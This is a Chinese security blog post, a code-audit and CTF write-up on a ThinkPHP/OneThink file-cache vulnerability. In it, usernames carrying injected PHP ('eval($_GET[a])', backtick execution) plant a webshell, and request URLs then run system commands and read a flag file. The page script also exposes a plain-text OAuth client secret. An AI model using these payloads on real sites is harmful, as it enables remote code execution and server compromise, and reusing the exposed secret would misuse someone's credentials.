@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Thinkphp5至3版本文件缓存漏洞 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Thinkphp5至3版本文件缓存漏洞</h2>
+  <p class="post-date">2019-05-09 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><strong>ThinkPHP5至3版本</strong>缓存文件函数使用不当</p>
+<h2 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h2><p>注册带有恶意php代码的用户名，登录该用户名<strong>thinkPHP</strong>将登录用户名写入缓存文件并且是以<strong>php</strong>文件形式。<br><strong>/ThinkPHP/Tpl/ThinkPHP.php</strong>设置文件路径</p>
+<h1 id="漏洞流程分析"><a href="#漏洞流程分析" class="headerlink" title="漏洞流程分析"></a>漏洞流程分析</h1><p><strong>/ThinkPHP/Tpl/ThinkPHP.php</strong>设置文件路径<br><img src="./1.png" alt=""></p>
+<p><strong>convertion.php</strong>下保存数据缓存设置</p>
+<p><code>DATA_CACHE_PREFIX、DATA_CACHE_PATH</code><br><img src="./2.png" alt=""></p>
+<p>对传入的文件名执行<code>md5($name)</code><br><img src="./3.png" alt=""></p>
+<p>跟进缓存文件操作类<strong>File.class.php</strong><br><code>filename</code>方法返回缓存文件名。<code>file_put_contents</code>写入缓存且$data带有php文件格式。<br><img src="./4.png" alt=""></p>
+<p>回溯查找系统调用<code>set</code>方法文件<br><img src="./5.png" alt=""></p>
+<p><strong>/ThinkPHP/functions.php</strong>文件下的<code>S</code>方法调用<code>set</code>方法<br><img src="./6.png" alt=""></p>
+<p>回溯<code>S</code>方法项目调用，在<strong>Application/Common/Api/UserApi.class.php:49行</strong>Ｓ参数<br><code>‘sys_active_user_list’</code>为文件名<code>$name</code>，<code>$list</code>为写入缓存的内容。<br><img src="./7.png" alt=""></p>
+<p>文件写入内容<code>$list</code>为从数据库提取的用户名<br><img src="./8.png" alt=""></p>
+<p>回溯<code>get_username()</code>方法，文件<strong>MemberModel.class.php第88行</strong><br><img src="./9.png" alt=""></p>
+<p>登录之后,执行文件缓存流程，缓存文件内容显示如下<br><img src="./10.png" alt=""></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>需要填入换行符才能绕过注释符号<br><code>%aphpinfo();//</code><br>注册与登录分别抓包把<code>%0a</code>解码<br><img src="./11.png" alt=""></p>
+<p>访问<br><code>http://127.0.0.1/cms/onthink1.0/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php</code><br><img src="./12.png" alt=""></p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>ichunqiu oneThink<br><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/" target="_blank" rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/</a></strong></p>
+<p>由于数据库长度限制，相继注册登录以下帐号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>a$a=$_GET[a];<span class="comment">//</span></span><br><span class="line">%<span class="number">0</span>aeval($a);<span class="comment">//</span></span><br><span class="line">也可以注册%<span class="number">0</span>aecho `$a`;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=system(%27ls%20/var/www/html%27)" target="_blank" rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=system(%27ls%20/var/www/html%27)</a>;</strong><br><img src="./13.png" alt=""></p>
+<p><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=highlight_file(%27/var/www/html/flag.php%27)" target="_blank" rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=highlight_file(%27/var/www/html/flag.php%27)</a>;</strong><br><img src="./14.png" alt=""></p>
+<p>#　参考链接<br><a href="https://www.anquanke.com/post/id/152584" target="_blank" rel="noopener">OneThink1.0文件缓存漏洞分析及题目复现</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.　动态调试的时候忘记在执行函数里下断点，造成debug无法跳入<br>2.　ThinkＰＨＰ框架还是不怎么娴熟，需要多学习</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#代码审计" >
+    <span class="tag-code">代码审计</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/05/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/">
+        <span class="nav-arrow">← </span>
+        
+          记一次简单渗透
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/">
+        
+          实验吧_web[1]
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#漏洞成因"><span class="toc-nav-text">漏洞成因</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞触发流程"><span class="toc-nav-text">漏洞触发流程</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#漏洞流程分析"><span class="toc-nav-text">漏洞流程分析</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#漏洞利用"><span class="toc-nav-text">漏洞利用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF"><span class="toc-nav-text">CTF</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#总结"><span class="toc-nav-text">总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/05/09/Thinkphp5-3文件缓存漏洞/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Thinkphp5至3版本文件缓存漏洞",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
